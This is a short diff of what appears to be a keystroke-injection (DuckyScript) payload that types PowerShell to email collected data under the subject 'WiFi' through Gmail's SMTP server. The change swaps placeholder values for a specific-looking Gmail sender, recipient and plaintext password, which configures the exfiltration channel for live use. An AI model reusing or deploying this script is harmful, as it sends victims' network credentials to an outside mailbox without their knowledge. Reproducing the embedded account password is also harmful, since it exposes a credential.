@@ -62,13 +62,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD');
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('earlreallong99@gmail.com', 'Tempy22Lily');
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
+STRING $ReportEmail.From = 'earlreallong99@gmail.com'
 ENTER
-STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
+STRING $ReportEmail.To.Add('reallong99@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = 'WiFi'
 ENTER
